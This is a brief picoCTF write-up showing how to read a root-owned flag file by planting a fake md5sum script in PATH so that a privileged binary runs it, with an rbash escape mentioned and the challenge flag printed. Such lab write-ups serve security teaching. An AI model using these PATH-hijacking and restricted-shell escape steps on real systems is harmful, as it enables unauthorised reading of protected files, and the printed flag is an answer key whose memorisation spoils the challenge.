# picoCTF Hash-Only Binary Writeup

**Flag**: `picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_63a87fa9}`

## Solution

The challenge has a `flaghasher` binary that calls `md5sum` on `/root/flag.txt`. We can hijack this with path injection.

Create a fake `md5sum` that just cats the file:
```bash
echo '#!/bin/bash' > ~/md5sum
echo 'cat "$1"' >> ~/md5sum
chmod +x ~/md5sum
```

Run with our malicious binary in PATH:
```bash
PATH=~/:$PATH ./flaghasher
```

Output:
```
Computing the MD5 hash of /root/flag.txt....
picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_63a87fa9}
```

## Key Points
- Escape rbash with `bash`
- PATH hijacking to replace system binaries
- Create fake `md5sum` that cats instead of hashing